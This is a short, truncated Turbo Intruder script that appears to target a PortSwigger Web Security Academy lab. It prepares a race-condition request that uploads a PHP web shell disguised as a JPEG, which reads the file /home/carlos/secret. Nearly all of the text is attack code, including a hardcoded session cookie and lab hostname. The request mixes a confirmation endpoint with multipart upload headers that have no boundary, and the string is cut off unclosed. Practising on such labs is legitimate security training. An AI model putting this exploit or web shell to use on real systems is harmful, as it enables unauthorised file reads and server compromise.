def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )
    
    # Hardcode the second request for the RC
    confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a2300b903934d5e816904f000670038.web-security-academy.net
Cookie: session=71rfdjeD0CZuxQyfdqPpN5vWZ4ygSzqv
Content-Length: 1573
Content-Disposition: form-data; name="avatar"; filename="test.jpg"
Content-Type: image/jpeg

<?php
    $file = '/home/carlos/secret'; // Specify the path to your file here
    $content = file_get_contents($file);
    echo $content;
?>